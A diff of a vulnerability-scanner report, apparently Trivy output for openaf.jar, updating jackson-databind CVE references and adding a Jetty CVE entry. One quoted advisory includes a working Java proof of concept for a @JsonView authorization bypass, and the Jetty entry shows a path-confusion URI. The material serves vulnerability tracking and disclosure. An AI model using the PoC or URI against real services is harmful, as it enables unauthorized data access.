@@ -446,10 +446,12 @@
                         │      ├ Severity        : HIGH 
                         │      ├ CweIDs           ╭ [0]: CWE-184 
                         │      │                  ╰ [1]: CWE-502 
-                        │      ├ VendorSeverity   ╭ alma  : 3 
-                        │      │                  ├ amazon: 3 
-                        │      │                  ├ ghsa  : 3 
-                        │      │                  ╰ redhat: 3 
+                        │      ├ VendorSeverity   ╭ alma       : 3 
+                        │      │                  ├ amazon     : 3 
+                        │      │                  ├ ghsa       : 3 
+                        │      │                  ├ oracle-oval: 3 
+                        │      │                  ├ redhat     : 3 
+                        │      │                  ╰ rocky      : 3 
                         │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
                         │      │                  │        │           /A:H 
                         │      │                  │        ╰ V3Score : 8.1 
@@ -460,16 +462,25 @@
                         │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-54512 
                         │      │                  ├ [2] : https://bugzilla.redhat.com/2492010 
                         │      │                  ├ [3] : https://bugzilla.redhat.com/2492015 
-                        │      │                  ├ [4] : https://errata.almalinux.org/9/ALSA-2026-40895.html 
-                        │      │                  ├ [5] : https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [6] : https://github.com/FasterXML/jackson-databind/commit/
+                        │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2492010 
+                        │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2492015 
+                        │      │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+                        │      │                  │       26-54512 
+                        │      │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+                        │      │                  │       26-54513 
+                        │      │                  ├ [8] : https://errata.almalinux.org/9/ALSA-2026-40895.html 
+                        │      │                  ├ [9] : https://errata.rockylinux.org/RLSA-2026:40895 
+                        │      │                  ├ [10]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [11]: https://github.com/FasterXML/jackson-databind/commit/
                         │      │                  │       434d6c511de7fdd9872f29157aafb6162d12d8d5 
-                        │      │                  ├ [7] : https://github.com/FasterXML/jackson-databind/issues/
+                        │      │                  ├ [12]: https://github.com/FasterXML/jackson-databind/issues/
                         │      │                  │       5988 
-                        │      │                  ├ [8] : https://github.com/FasterXML/jackson-databind/securit
+                        │      │                  ├ [13]: https://github.com/FasterXML/jackson-databind/securit
                         │      │                  │       y/advisories/GHSA-j3rv-43j4-c7qm 
-                        │      │                  ├ [9] : https://nvd.nist.gov/vuln/detail/CVE-2026-54512 
-                        │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-54512 
+                        │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-54512.html 
+                        │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-43400.html 
+                        │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-54512 
+                        │      │                  ╰ [17]: https://www.cve.org/CVERecord?id=CVE-2026-54512 
                         │      ├ PublishedDate   : 2026-06-23T21:17:02.203Z 
                         │      ╰ LastModifiedDate: 2026-06-27T21:01:36.47Z 
                         ├ [2]  ╭ VulnerabilityID : CVE-2026-54513 
@@ -512,10 +523,12 @@
                         │      │                    in 2.18.8, 2.21.4, and 3.1.4. 
                         │      ├ Severity        : HIGH 
                         │      ├ CweIDs           ─ [0]: CWE-184 
-                        │      ├ VendorSeverity   ╭ alma  : 3 
-                        │      │                  ├ amazon: 3 
-                        │      │                  ├ ghsa  : 3 
-                        │      │                  ╰ redhat: 3 
+                        │      ├ VendorSeverity   ╭ alma       : 3 
+                        │      │                  ├ amazon     : 3 
+                        │      │                  ├ ghsa       : 3 
+                        │      │                  ├ oracle-oval: 3 
+                        │      │                  ├ redhat     : 3 
+                        │      │                  ╰ rocky      : 3 
                         │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
                         │      │                  │        │           /A:H 
                         │      │                  │        ╰ V3Score : 8.1 
@@ -525,29 +538,46 @@
                         │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:36839 
                         │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:40895 
                         │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:41951 
-                        │      │                  ├ [3] : https://access.redhat.com/security/cve/CVE-2026-54513 
-                        │      │                  ├ [4] : https://bugzilla.redhat.com/2492010 
-                        │      │                  ├ [5] : https://bugzilla.redhat.com/2492015 
-                        │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2492010 
-                        │      │                  ├ [7] : https://errata.almalinux.org/9/ALSA-2026-40895.html 
-                        │      │                  ├ [8] : https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [9] : https://github.com/FasterXML/jackson-databind/commit/
+                        │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:43218 
+                        │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:43400 
+                        │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:44061 
+                        │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:44062 
+                        │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:44063 
+                        │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:44064 
+                        │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:44065 
+                        │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:44066 
+                        │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:44271 
+                        │      │                  ├ [12]: https://access.redhat.com/security/cve/CVE-2026-54513 
+                        │      │                  ├ [13]: https://bugzilla.redhat.com/2492010 
+                        │      │                  ├ [14]: https://bugzilla.redhat.com/2492015 
+                        │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2492010 
+                        │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2492015 
+                        │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+                        │      │                  │       26-54512 
+                        │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+                        │      │                  │       26-54513 
+                        │      │                  ├ [19]: https://errata.almalinux.org/9/ALSA-2026-40895.html 
+                        │      │                  ├ [20]: https://errata.rockylinux.org/RLSA-2026:40895 
+                        │      │                  ├ [21]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [22]: https://github.com/FasterXML/jackson-databind/commit/
                         │      │                  │       01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5 
-                        │      │                  ├ [10]: https://github.com/FasterXML/jackson-databind/commit/
+                        │      │                  ├ [23]: https://github.com/FasterXML/jackson-databind/commit/
                         │      │                  │       24529da29fdf46ff94ca38de9ebf31cd188f5e8e 
-                        │      │                  ├ [11]: https://github.com/FasterXML/jackson-databind/issues/
+                        │      │                  ├ [24]: https://github.com/FasterXML/jackson-databind/issues/
                         │      │                  │       5981 
-                        │      │                  ├ [12]: https://github.com/FasterXML/jackson-databind/issues/
+                        │      │                  ├ [25]: https://github.com/FasterXML/jackson-databind/issues/
                         │      │                  │       5983 
-                        │      │                  ├ [13]: https://github.com/FasterXML/jackson-databind/pull/5984 
-                        │      │                  ├ [14]: https://github.com/FasterXML/jackson-databind/securit
+                        │      │                  ├ [26]: https://github.com/FasterXML/jackson-databind/pull/5984 
+                        │      │                  ├ [27]: https://github.com/FasterXML/jackson-databind/securit
                         │      │                  │       y/advisories/GHSA-rmj7-2vxq-3g9f 
-                        │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-54513 
-                        │      │                  ├ [16]: https://security.access.redhat.com/data/csaf/v2/vex/2
+                        │      │                  ├ [28]: https://linux.oracle.com/cve/CVE-2026-54513.html 
+                        │      │                  ├ [29]: https://linux.oracle.com/errata/ELSA-2026-43400.html 
+                        │      │                  ├ [30]: https://nvd.nist.gov/vuln/detail/CVE-2026-54513 
+                        │      │                  ├ [31]: https://security.access.redhat.com/data/csaf/v2/vex/2
                         │      │                  │       026/cve-2026-54513.json 
-                        │      │                  ╰ [17]: https://www.cve.org/CVERecord?id=CVE-2026-54513 
+                        │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-54513 
                         │      ├ PublishedDate   : 2026-06-23T21:17:02.333Z 
-                        │      ╰ LastModifiedDate: 2026-07-21T12:18:57.163Z 
+                        │      ╰ LastModifiedDate: 2026-07-23T12:18:26.847Z 
                         ├ [3]  ╭ VulnerabilityID : CVE-2026-54514 
                         │      ├ VendorIDs        ─ [0]: GHSA-hgj6-7826-r7m5 
                         │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
@@ -957,194 +987,253 @@
                         │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
                         │      ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
                         │      ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
-                        ╰ [10] ╭ VulnerabilityID : GHSA-mhm7-754m-9p8w 
-                               ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        ├ [10] ╭ VulnerabilityID : GHSA-mhm7-754m-9p8w 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.18.9, 2.21.5 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:f6d19c232fb74a3e035c096c166125e7b47080791562
+                        │      │                  │         853f161bdeaf4554604f 
+                        │      │                  ╰ DiffID: sha256:859460a4f7f72d8a5f8ffba79faa5d43934d29ca222a
+                        │      │                            d38c63687efc14b65fca 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-mhm7-754m-9p8w 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:3afe54b0227e5cc2f895b307c957a3d236ba0f5b230cddd8e33f8
+                        │      │                   84ab84b45d8 
+                        │      ├ Title           : jackson-databind: `@JsonView` bypass for creator properties
+                        │      │                   with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)` 
+                        │      ├ Description     : ## Summary
+                        │      │                   
+                        │      │                   In
+                        │      │                   `BeanDeserializer.deserializeUsingPropertyBasedWithExternalT
+                        │      │                   ypeId`, the active-view (`@JsonView`) filter was applied
+                        │      │                   only to the regular bean-property branch; the
+                        │      │                   creator-property branch performed no
+                        │      │                   `creatorProp.visibleInView(activeView)` check. A constructor
+                        │      │                    parameter annotated with both
+                        │      │                   `@JsonView(RestrictedView.class)` and
+                        │      │                   `@JsonTypeInfo(use=Id.NAME,
+                        │      │                     include=As.EXTERNAL_PROPERTY)` is populated from attacker
+                        │      │                   JSON even when a more restrictive view is active.
+                        │      │                     This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and
+                        │      │                   GHSA-rcqc (CVE-2026-54518) descriptions cover only the main
+                        │      │                   property-based path and the unwrapped-creator path
+                        │      │                   respectively; the external-type-id creator path was fixed on
+                        │      │                    the 3.x line via #6004 ("Extend #5969/#5971 fixes to ...
+                        │      │                   external-type-id case in regular BeanDeserializer", commit
+                        │      │                   7dc7a17, 2026-05-22) but
+                        │      │                     **the fix was never backported to 2.21 or 2.18**. Users on
+                        │      │                    2.21.4 and 2.18.8 who upgraded per the published advisories
+                        │      │                    remain vulnerable to the same `@JsonView` bypass technique
+                        │      │                   via a different code path.
+                        │      │                   ## Vulnerable Code Path
+                        │      │                   File:
+                        │      │                   `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`
+                        │      │                   Method: `deserializeUsingPropertyBasedWithExternalTypeId`
+                        │      │                   On 2.21.4 (and 2.18.8), the creator-property branch (around
+                        │      │                   line 1125-1158) checks `creatorProp.isInjectionOnly()` and
+                        │      │                   hands off to `ext.handlePropertyValue(...)` /
+                        │      │                   `buffer.assignParameter(...)` without ever consulting
+                        │      │                   `visibleInView(activeView)`:
+                        │      │                    ```java
+                        │      │                     if (creatorProp != null) {
+                        │      │                         // [databind#1381]: if useInput=FALSE, skip
+                        │      │                   deserialization from input
+                        │      │                         if (creatorProp.isInjectionOnly()) { ... }
+                        │      │                         // NO visibleInView(activeView) CHECK HERE
+                        │      │                         if (!ext.handlePropertyValue(p, ctxt, propName, null))
+                        │      │                    {
+                        │      │                             if (buffer.assignParameter(creatorProp, ...)) {
+                        │      │                   ... }
+                        │      │                         }
+                        │      │                         continue;
+                        │      │                     }
+                        │      │                   ```
+                        │      │                   On 3.1.4, the same branch contains the additional guard
+                        │      │                   (commit 7dc7a17):
+                        │      │                      if (creatorProp != null) {
+                        │      │                         // [databind#5971]: must honor active view here too
+                        │      │                         if ((activeView != null) &&
+                        │      │                   !creatorProp.visibleInView(activeView)) {
+                        │      │                             p.skipChildren();
+                        │      │                             continue;
+                        │      │                         ...
+                        │      │                   The 2.21 and 2.18 backport PRs (#6005 and #6003) only
+                        │      │                   backported the main-path fixes from #5969/#5971; the
+                        │      │                   external-type-id fix from #6004 was not backported. The
+                        │      │                   maintainer closed #6005
+                        │      │                     with "got changes merged forward, looks like it's all
+                        │      │                   covered now", but the forward-merge did not include the
+                        │      │                   ExtTypeId creator branch.
+                        │      │                     Proof of Concept
+                        │      │                     Compiles and runs against jackson-databind 2.21.4:
+                        │      │                    
+                        │      │                   ```java
+                        │      │                     import com.fasterxml.jackson.annotation.*;
+                        │      │                     import com.fasterxml.jackson.databind.ObjectMapper;
+                        │      │                     public class JsonViewExternalTypeIdBypass {
+                        │      │                         public static class PublicView {}
+                        │      │                         public static class AdminView extends PublicView {}
+                        │      │                         public static abstract class Asset { public String
+                        │      │                   name; }
+                        │      │                         public static class PublicAsset extends Asset {}
+                        │      │                         public static class AdminAsset extends Asset { public
+                        │      │                   String secret; }
+                        │      │                         public static class Container {
+                        │      │                             @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
+                        │      │                                     include =
+                        │      │                   JsonTypeInfo.As.EXTERNAL_PROPERTY,
+                        │      │                                     property = "kind")
+                        │      │                             @JsonSubTypes({
+                        │      │                                 @JsonSubTypes.Type(value = PublicAsset.class,
+                        │      │                   name = "pub"),
+                        │      │                                 @JsonSubTypes.Type(value = AdminAsset.class, 
+                        │      │                   name = "admin")
+                        │      │                             })
+                        │      │                             @JsonView(AdminView.class)
+                        │      │                             public Asset asset;
+                        │      │                             public String label;
+                        │      │                             @JsonCreator
+                        │      │                             public Container(
+                        │      │                                     @JsonProperty("label") String label,
+                        │      │                                     @JsonProperty("asset")
+                        │      │                   @JsonView(AdminView.class) Asset asset) {
+                        │      │                                 this.label = label;
+                        │      │                                 this.asset = asset;
+                        │      │                             }
+                        │      │                         public static class Wrapper {
+                        │      │                             @JsonView(PublicView.class)
+                        │      │                             public Container data;
+                        │      │                         public static void main(String[] args) throws
+                        │      │                   Exception {
+                        │      │                             // Admin-only "asset" should be blocked when
+                        │      │                   reading with PublicView
+                        │      │                             String json =
+                        │      │                   "{\"data\":{\"label\":\"hello\",\"kind\":\"admin\","
+                        │      │                                         +
+                        │      │                   "\"asset\":{\"name\":\"foo\",\"secret\":\"LEAKED\"}}}";
+                        │      │                             ObjectMapper om = new ObjectMapper();
+                        │      │                             Wrapper r = om.readerWithView(PublicView.class)
+                        │      │                                     .forType(Wrapper.class)
+                        │      │                                     .readValue(json);
+                        │      │                             System.out.println(r.data);
+                        │      │                             // Actual on 2.21.4:   Container{label='hello',
+                        │      │                   asset=AdminAsset{name='foo', secret='LEAKED'}}
+                        │      │                             // Expected (secure):  Container{label='hello',
+                        │      │                   asset=null}
+                        │      │                             if (r.data.asset != null && r.data.asset
+                        │      │                   instanceof AdminAsset) {
+                        │      │                                 System.out.println("[!!] BYPASS CONFIRMED —
+                        │      │                   admin-only asset populated under PublicView");
+                        │      │                   A control case that removes include = As.EXTERNAL_PROPERTY
+                        │      │                   (forcing the normal property-based path) correctly returns
+                        │      │                   asset = null, confirming the bypass is specific to the
+                        │      │                   ExternalTypeId
+                        │      │                     code path and not a misconfiguration.
+                        │      │                   ### Impact
+                        │      │                     View-restricted (e.g. admin-only) creator properties can
+                        │      │                   be populated from untrusted input where @JsonView is used as
+                        │      │                    a write-side authorization boundary. Typical victims are
+                        │      │                   Spring Boot
+                        │      │                     REST controllers that use @JsonView(PublicView.class) on
+                        │      │                   the request body to whitelist user-settable fields — an
+                        │      │                   attacker can inject the restricted creator parameter
+                        │      │                   (including choosing
+                        │      │                     the polymorphic subtype via the sibling kind/type-id
+                        │      │                   property) by combining it with a polymorphic
+                        │      │                   @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same
+                        │      │                   field.
+                        │      │                   - CWE-863 (Incorrect Authorization)
+                        │      │                   - Same impact class as CVE-2026-54517 / CVE-2026-54518
+                        │      │                   - No RCE, no DoS — this is an access-control /
+                        │      │                   mass-assignment bypass
+                        │      │                   ### Trigger Conditions
+                        │      │                   Developer code must combine (no opt-in user configuration
+                        │      │                   required):
+                        │      │                   1. Property-based @JsonCreator on the outer type
+                        │      │                   2. A creator parameter annotated with
+                        │      │                   @JsonView(RestrictedView.class)
+                        │      │                   3. The same parameter annotated with
+                        │      │                   @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY,
+                        │      │                   property="...") 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ VendorSeverity   ─ ghsa: 2 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
+                        │      │                         ╰ V3Score : 6.5 
+                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/c
+                        │      │                  │      628b357ed143d8492756d5c1458cfb9fbeb29ed 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/d
+                        │      │                  │      ea7eb466e98cc226c4ac65587581fb49926820c 
+                        │      │                  ╰ [3]: https://github.com/FasterXML/jackson-databind/security
+                        │      │                         /advisories/GHSA-mhm7-754m-9p8w 
+                        │      ├ PublishedDate   : 2026-07-21T19:40:12Z 
+                        │      ╰ LastModifiedDate: 2026-07-21T19:40:12Z 
+                        ╰ [11] ╭ VulnerabilityID : CVE-2026-8384 
+                               ├ VendorIDs        ─ [0]: GHSA-w7x5-g22v-xqhr 
+                               ├ PkgName         : org.eclipse.jetty:jetty-util 
                                ├ PkgPath         : openaf/openaf.jar 
-                               ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                               │                  │       @2.21.1 
-                               │                  ╰ UID : 6bd66f14c6cb3d57 
-                               ├ InstalledVersion: 2.21.1 
-                               ├ FixedVersion    : 2.18.9, 2.21.5 
+                               ├ PkgIdentifier    ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-util@12.1.7 
+                               │                  ╰ UID : 55174ef89c50ef33 
+                               ├ InstalledVersion: 12.1.7 
+                               ├ FixedVersion    : 12.0.35, 12.1.9 
                                ├ Status          : fixed 
                                ├ Layer            ╭ Digest: sha256:f6d19c232fb74a3e035c096c166125e7b47080791562
                                │                  │         853f161bdeaf4554604f 
                                │                  ╰ DiffID: sha256:859460a4f7f72d8a5f8ffba79faa5d43934d29ca222a
                                │                            d38c63687efc14b65fca 
                                ├ SeveritySource  : ghsa 
-                               ├ PrimaryURL      : https://github.com/advisories/GHSA-mhm7-754m-9p8w 
+                               ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-8384 
                                ├ DataSource       ╭ ID  : ghsa 
                                │                  ├ Name: GitHub Security Advisory Maven 
                                │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                                │                          cosystem%3Amaven 
-                               ├ Fingerprint     : sha256:3afe54b0227e5cc2f895b307c957a3d236ba0f5b230cddd8e33f8
-                               │                   84ab84b45d8 
-                               ├ Title           : jackson-databind: `@JsonView` bypass for creator properties
-                               │                   with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)` 
-                               ├ Description     : ## Summary
+                               ├ Fingerprint     : sha256:29bb35bde83f478205907fd0405efb00d6e0f4fc385e59082ee77
+                               │                   0e591bcdf9d 
+                               ├ Title           : In Eclipse Jetty, an HTTP URI of this form:     
+                               │                   /public;/../admin/sec ... 
+                               ├ Description     : In Eclipse Jetty, an HTTP URI of this form:
                                │                   
-                               │                   In
-                               │                   `BeanDeserializer.deserializeUsingPropertyBasedWithExternalT
-                               │                   ypeId`, the active-view (`@JsonView`) filter was applied
-                               │                   only to the regular bean-property branch; the
-                               │                   creator-property branch performed no
-                               │                   `creatorProp.visibleInView(activeView)` check. A constructor
-                               │                    parameter annotated with both
-                               │                   `@JsonView(RestrictedView.class)` and
-                               │                   `@JsonTypeInfo(use=Id.NAME,
-                               │                     include=As.EXTERNAL_PROPERTY)` is populated from attacker
-                               │                   JSON even when a more restrictive view is active.
-                               │                     This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and
-                               │                   GHSA-rcqc (CVE-2026-54518) descriptions cover only the main
-                               │                   property-based path and the unwrapped-creator path
-                               │                   respectively; the external-type-id creator path was fixed on
-                               │                    the 3.x line via #6004 ("Extend #5969/#5971 fixes to ...
-                               │                   external-type-id case in regular BeanDeserializer", commit
-                               │                   7dc7a17, 2026-05-22) but
-                               │                     **the fix was never backported to 2.21 or 2.18**. Users on
-                               │                    2.21.4 and 2.18.8 who upgraded per the published advisories
-                               │                    remain vulnerable to the same `@JsonView` bypass technique
-                               │                   via a different code path.
-                               │                   ## Vulnerable Code Path
-                               │                   File:
-                               │                   `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`
-                               │                   Method: `deserializeUsingPropertyBasedWithExternalTypeId`
-                               │                   On 2.21.4 (and 2.18.8), the creator-property branch (around
-                               │                   line 1125-1158) checks `creatorProp.isInjectionOnly()` and
-                               │                   hands off to `ext.handlePropertyValue(...)` /
-                               │                   `buffer.assignParameter(...)` without ever consulting
-                               │                   `visibleInView(activeView)`:
-                               │                    ```java
-                               │                     if (creatorProp != null) {
-                               │                         // [databind#1381]: if useInput=FALSE, skip
-                               │                   deserialization from input
-                               │                         if (creatorProp.isInjectionOnly()) { ... }
-                               │                         // NO visibleInView(activeView) CHECK HERE
-                               │                         if (!ext.handlePropertyValue(p, ctxt, propName, null))
-                               │                    {
-                               │                             if (buffer.assignParameter(creatorProp, ...)) {
-                               │                   ... }
-                               │                         }
-                               │                         continue;
-                               │                     }
-                               │                   ```
-                               │                   On 3.1.4, the same branch contains the additional guard
-                               │                   (commit 7dc7a17):
-                               │                      if (creatorProp != null) {
-                               │                         // [databind#5971]: must honor active view here too
-                               │                         if ((activeView != null) &&
-                               │                   !creatorProp.visibleInView(activeView)) {
-                               │                             p.skipChildren();
-                               │                             continue;
-                               │                         ...
-                               │                   The 2.21 and 2.18 backport PRs (#6005 and #6003) only
-                               │                   backported the main-path fixes from #5969/#5971; the
-                               │                   external-type-id fix from #6004 was not backported. The
-                               │                   maintainer closed #6005
-                               │                     with "got changes merged forward, looks like it's all
-                               │                   covered now", but the forward-merge did not include the
-                               │                   ExtTypeId creator branch.
-                               │                     Proof of Concept
-                               │                     Compiles and runs against jackson-databind 2.21.4:
-                               │                    
-                               │                   ```java
-                               │                     import com.fasterxml.jackson.annotation.*;
-                               │                     import com.fasterxml.jackson.databind.ObjectMapper;
-                               │                     public class JsonViewExternalTypeIdBypass {
-                               │                         public static class PublicView {}
-                               │                         public static class AdminView extends PublicView {}
-                               │                         public static abstract class Asset { public String
-                               │                   name; }
-                               │                         public static class PublicAsset extends Asset {}
-                               │                         public static class AdminAsset extends Asset { public
-                               │                   String secret; }
-                               │                         public static class Container {
-                               │                             @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
-                               │                                     include =
-                               │                   JsonTypeInfo.As.EXTERNAL_PROPERTY,
-                               │                                     property = "kind")
-                               │                             @JsonSubTypes({
-                               │                                 @JsonSubTypes.Type(value = PublicAsset.class,
-                               │                   name = "pub"),
-                               │                                 @JsonSubTypes.Type(value = AdminAsset.class, 
-                               │                   name = "admin")
-                               │                             })
-                               │                             @JsonView(AdminView.class)
-                               │                             public Asset asset;
-                               │                             public String label;
-                               │                             @JsonCreator
-                               │                             public Container(
-                               │                                     @JsonProperty("label") String label,
-                               │                                     @JsonProperty("asset")
-                               │                   @JsonView(AdminView.class) Asset asset) {
-                               │                                 this.label = label;
-                               │                                 this.asset = asset;
-                               │                             }
-                               │                         public static class Wrapper {
-                               │                             @JsonView(PublicView.class)
-                               │                             public Container data;
-                               │                         public static void main(String[] args) throws
-                               │                   Exception {
-                               │                             // Admin-only "asset" should be blocked when
-                               │                   reading with PublicView
-                               │                             String json =
-                               │                   "{\"data\":{\"label\":\"hello\",\"kind\":\"admin\","
-                               │                                         +
-                               │                   "\"asset\":{\"name\":\"foo\",\"secret\":\"LEAKED\"}}}";
-                               │                             ObjectMapper om = new ObjectMapper();
-                               │                             Wrapper r = om.readerWithView(PublicView.class)
-                               │                                     .forType(Wrapper.class)
-                               │                                     .readValue(json);
-                               │                             System.out.println(r.data);
-                               │                             // Actual on 2.21.4:   Container{label='hello',
-                               │                   asset=AdminAsset{name='foo', secret='LEAKED'}}
-                               │                             // Expected (secure):  Container{label='hello',
-                               │                   asset=null}
-                               │                             if (r.data.asset != null && r.data.asset
-                               │                   instanceof AdminAsset) {
-                               │                                 System.out.println("[!!] BYPASS CONFIRMED —
-                               │                   admin-only asset populated under PublicView");
-                               │                   A control case that removes include = As.EXTERNAL_PROPERTY
-                               │                   (forcing the normal property-based path) correctly returns
-                               │                   asset = null, confirming the bypass is specific to the
-                               │                   ExternalTypeId
-                               │                     code path and not a misconfiguration.
-                               │                   ### Impact
-                               │                     View-restricted (e.g. admin-only) creator properties can
-                               │                   be populated from untrusted input where @JsonView is used as
-                               │                    a write-side authorization boundary. Typical victims are
-                               │                   Spring Boot
-                               │                     REST controllers that use @JsonView(PublicView.class) on
-                               │                   the request body to whitelist user-settable fields — an
-                               │                   attacker can inject the restricted creator parameter
-                               │                   (including choosing
-                               │                     the polymorphic subtype via the sibling kind/type-id
-                               │                   property) by combining it with a polymorphic
-                               │                   @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same
-                               │                   field.
-                               │                   - CWE-863 (Incorrect Authorization)
-                               │                   - Same impact class as CVE-2026-54517 / CVE-2026-54518
-                               │                   - No RCE, no DoS — this is an access-control /
-                               │                   mass-assignment bypass
-                               │                   ### Trigger Conditions
-                               │                   Developer code must combine (no opt-in user configuration
-                               │                   required):
-                               │                   1. Property-based @JsonCreator on the outer type
-                               │                   2. A creator parameter annotated with
-                               │                   @JsonView(RestrictedView.class)
-                               │                   3. The same parameter annotated with
-                               │                   @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY,
-                               │                   property="...") 
+                               │                   /public;/../admin/secret.txt
+                               │                   results in an unresolved path of:
+                               │                   /public/../admin/secret.txt
+                               │                   instead of the expected:
+                               │                   /admin/secret.txt
+                               │                   Jetty itself is not affected, as it will not serve the
+                               │                   secret.txt file because it will not pass the alias checker
+                               │                   (only resolved resources are served).
+                               │                   However, web applications that rely on resolved paths being
+                               │                   provided by Jetty may be confused when receiving an
+                               │                   unresolved path. 
                                ├ Severity        : MEDIUM 
+                               ├ CweIDs           ─ [0]: CWE-647 
                                ├ VendorSeverity   ─ ghsa: 2 
-                               ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
-                               │                         ╰ V3Score : 6.5 
-                               ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
-                               │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/c
-                               │                  │      628b357ed143d8492756d5c1458cfb9fbeb29ed 
-                               │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/d
-                               │                  │      ea7eb466e98cc226c4ac65587581fb49926820c 
-                               │                  ╰ [3]: https://github.com/FasterXML/jackson-databind/security
-                               │                         /advisories/GHSA-mhm7-754m-9p8w 
-                               ├ PublishedDate   : 2026-07-21T19:40:12Z 
-                               ╰ LastModifiedDate: 2026-07-21T19:40:12Z 
+                               ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
+                               │                         ╰ V3Score : 5.3 
+                               ├ References       ╭ [0]: https://github.com/jetty/jetty.project 
+                               │                  ├ [1]: https://github.com/jetty/jetty.project/commit/82969c77
+                               │                  │      f6da46e27008b10b3c14840cd31db084 
+                               │                  ├ [2]: https://github.com/jetty/jetty.project/commit/ade27ce9
+                               │                  │      3a37c33278720250d85c48601230ae3f 
+                               │                  ├ [3]: https://github.com/jetty/jetty.project/pull/14969 
+                               │                  ├ [4]: https://github.com/jetty/jetty.project/pull/14973 
+                               │                  ├ [5]: https://github.com/jetty/jetty.project/releases/tag/je
+                               │                  │      tty-12.0.35 
+                               │                  ├ [6]: https://github.com/jetty/jetty.project/releases/tag/je
+                               │                  │      tty-12.1.9 
+                               │                  ├ [7]: https://github.com/jetty/jetty.project/security/adviso
+                               │                  │      ries/GHSA-w7x5-g22v-xqhr 
